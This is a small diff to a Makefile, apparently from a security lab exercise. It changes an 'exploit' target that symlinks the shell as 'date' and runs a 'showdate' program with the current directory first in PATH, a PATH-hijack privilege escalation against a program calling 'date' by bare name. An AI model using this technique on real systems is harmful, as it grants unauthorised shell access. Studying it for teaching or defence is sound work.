@@ -1,7 +1,7 @@
 all: set_permissions
 
 exploit:
-	ln -s /usr/bin/sh date
+	ln -s $(shell which sh) date
 	PATH=.:$(PATH) ./showdate
 
 clean:
